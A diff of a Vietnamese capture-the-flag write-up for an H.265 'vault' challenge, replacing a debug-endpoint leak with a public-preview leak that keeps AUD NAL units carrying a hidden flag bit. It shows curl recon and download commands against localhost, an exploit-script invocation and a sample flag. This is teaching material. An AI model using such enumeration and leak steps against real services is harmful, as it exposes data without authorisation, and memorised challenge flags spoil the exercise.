@@ -2,27 +2,26 @@
 
 ## 1. Tóm tắt lỗi
 
-Service lưu flag vào raw HEVC Annex-B bitstream. API đọc hợp lệ `/api/read` có
-kiểm tra `token`, nhưng service lại để lộ hai route debug:
+Service lưu flag vào raw HEVC Annex-B bitstream. Luồng hợp lệ `/api/read` và
+`/api/carrier` đều cần `token`, nhưng service có tính năng public preview:
 
 ```text
-/api/debug/list
-/api/debug/file/<filename>
+/api/share/<id>/preview.h265
 ```
 
-Hai route này không cần token. Vì flag nằm trong chính carrier `.h265`, attacker
-chỉ cần tải file về, tách NAL type 35 và đọc kênh AUD là lấy được flag.
+Preview được quảng bá là metadata-only vì đã bỏ VCL slice chứa dữ liệu ảnh. Lỗi
+là preview vẫn giữ AUD NAL type 35. Trong bài này, AUD không vô hại: bit thấp
+nhất của `primary_pic_type` đang chứa kênh ẩn.
 
-## 2. Kiểm tra service
+## 2. Recon service
 
-Chạy service:
+Mở dashboard:
 
-```bash
-cd service
-docker compose up --build
+```text
+http://127.0.0.1:8000/
 ```
 
-Kiểm tra health:
+Kiểm tra service:
 
 ```bash
 curl http://127.0.0.1:8000/health
@@ -34,52 +33,52 @@ Kết quả hợp lệ:
 {"ok":true}
 ```
 
-Khi nộp theo form, nên chụp màn hình bước này để chứng minh service đang chạy.
+Dashboard cho thấy service có luồng store/read hợp lệ và có public preview.
 
-## 3. Đặt flag mẫu vào service
+## 3. Tìm target public
 
-Dùng checker mode `put`:
+Liệt kê các vault public:
 
 ```bash
-python checker/checker.py put 127.0.0.1 8000 'blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}'
+curl http://127.0.0.1:8000/api/vaults
 ```
 
-Checker sẽ in ra `flag_id` dạng JSON, ví dụ:
+Ví dụ output:
 
 ```json
-{"id":"flag_1710000000_abcd1234","token":"..."}
+{
+  "items": [
+    {
+      "id": "flag_1710000000_abcd1234",
+      "preview_url": "/api/share/flag_1710000000_abcd1234/preview.h265",
+      "share_url": "/share/flag_1710000000_abcd1234"
+    }
+  ],
+  "ok": true
+}
 ```
 
-Đọc lại bằng mode `get`:
+Attacker không có token nên không gọi được `/api/read` hoặc `/api/carrier`.
+Nhưng `preview_url` là public.
+
+## 4. Tải preview và khai thác
+
+Tải public preview:
 
 ```bash
-python checker/checker.py get 127.0.0.1 8000 '{"id":"flag_1710000000_abcd1234","token":"..."}' 'blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}'
+curl -o preview.h265 http://127.0.0.1:8000/api/share/flag_1710000000_abcd1234/preview.h265
 ```
 
-## 4. Khai thác debug endpoint
-
-Liệt kê file debug:
-
-```bash
-curl http://127.0.0.1:8000/api/debug/list
-```
-
-Nếu service còn lỗi, server trả về danh sách carrier:
-
-```json
-{"files":["flag_1710000000_abcd1234.h265"],"ok":true}
-```
-
-Tải carrier:
-
-```bash
-curl -o leaked.h265 http://127.0.0.1:8000/api/debug/file/flag_1710000000_abcd1234.h265
-```
-
-Script attack có sẵn:
+Chạy script exploit:
 
 ```bash
 python solution/exploit.py http://127.0.0.1:8000
+```
+
+Nếu đã biết target id:
+
+```bash
+python solution/exploit.py http://127.0.0.1:8000 --id flag_1710000000_abcd1234
 ```
 
 Output:
@@ -87,9 +86,6 @@ Output:
 ```text
 blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}
 ```
-
-Khi nộp theo form, nên chụp màn hình các lệnh `/api/debug/list`, tải carrier
-`.h265`, và output của exploit.
 
 ## 5. Phân tích kênh H.265
 
@@ -132,6 +128,7 @@ CRC32 giúp loại bỏ bitstream sai hoặc không phải carrier của bài.
 
 Đặt ảnh vào `solution/screenshots/` nếu cần nộp kèm:
 
-- `attack-01-service-health.png`: service chạy và `/health` trả về `ok`.
-- `attack-02-debug-list.png`: `/api/debug/list` làm lộ file `.h265`.
-- `attack-03-exploit-flag.png`: `solution/exploit.py` hoặc checker exploit in ra flag.
+- `attack-01-dashboard.png`: dashboard `/` có form store/read và public preview.
+- `attack-02-vaults.png`: `/api/vaults` làm lộ target id và preview URL.
+- `attack-03-preview-download.png`: tải được public preview `.h265`.
+- `attack-04-exploit-flag.png`: exploit in ra flag.
